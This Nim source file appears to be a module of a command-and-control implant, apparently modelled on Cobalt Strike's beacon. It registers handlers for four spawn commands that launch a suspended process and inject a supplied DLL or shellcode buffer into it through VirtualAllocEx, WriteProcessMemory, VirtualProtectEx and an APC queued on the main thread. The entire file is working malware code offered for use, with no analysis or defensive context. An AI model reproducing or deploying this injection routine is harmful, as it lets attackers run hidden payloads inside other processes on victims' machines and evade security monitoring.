import ../../[utils, config]
import ../[types]
import winim
import winim/[lean, winstr]
import winim/inc/winbase
import std/[strutils]
import exec

var last_spawned*: PROCESS_INFORMATION

proc inject_temp_process(dll: seq[byte], dll_x64, use_token: bool) =
    # only implemented apc injection
    when inject_method == "a":
        # 1. create suspended process
        # todo, judge if process x64 and if spawn_to_x64 is the only word
        var app = config.spawn_to_x64.replace("sysnative", "system32")
        var args = ""
        var pi = create_process(app, args, false, use_token, true)
        if pi.hProcess == 0:
            dbg "[-] CreateProcess failed: " & $GetLastError()
            return
        last_spawned = pi    

        # 2. allocate memory in target process and write dll content
        var bytesWritten, old_protect: DWORD = 0
        var target_addr = VirtualAllocEx(pi.hProcess, nil, dll.len, MEM_COMMIT.DWORD, PAGE_READWRITE.DWORD)
        if target_addr == nil:
            dbg "[-] VirtualAllocEx failed: " & $GetLastError()
            return
        if WriteProcessMemory(pi.hProcess, target_addr, dll[0].addr, dll.len, nil) == 0:
            dbg "[-] WriteProcessMemory failed: " & $GetLastError()
            return
        if VirtualProtectEx(pi.hProcess, target_addr, dll.len, PAGE_EXECUTE_READ.DWORD, &old_protect) == 0:
            dbg "[-] VirtualProtectEx failed: " & $GetLastError()
            return

        # 3. inject an APC and resume thread
        if QueueUserAPC(cast[PAPCFUNC](target_addr), pi.hThread, 0) == 0:
            dbg "[-] QueueUserAPC failed: " & $GetLastError()
            return
        if ResumeThread(pi.hThread) == -1:
            dbg "[-] ResumeThread failed: " & $GetLastError()
            return

proc inject_self(dll: seq[byte], dll_x64, use_token: bool) =
    discard

proc spawn_and_inject(buf: var seq[byte], cmd: command_type) =
    var use_token, dll_x64: bool
    case cmd
    of CMD_TYPE_SPAWN_TOKEN_X64:
        use_token = true
        dll_x64 = true
    of CMD_TYPE_SPAWN_TOKEN_X86:
        use_token = true
        dll_x64 = false
    of CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
        use_token = false
        dll_x64 = true
    of CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
        use_token = false
        dll_x64 = false
    else:
        return

    when not inject_self:
        inject_temp_process(buf, dll_x64, use_token)
    else:
        inject_self(buf, dll_x64, use_token)

register_command(CMD_TYPE_SPAWN_TOKEN_X64, spawn_and_inject)
register_command(CMD_TYPE_SPAWN_TOKEN_X86, spawn_and_inject)
register_command(CMD_TYPE_SPAWN_IGNORE_TOKEN_X64, spawn_and_inject)
register_command(CMD_TYPE_SPAWN_IGNORE_TOKEN_X86, spawn_and_inject)
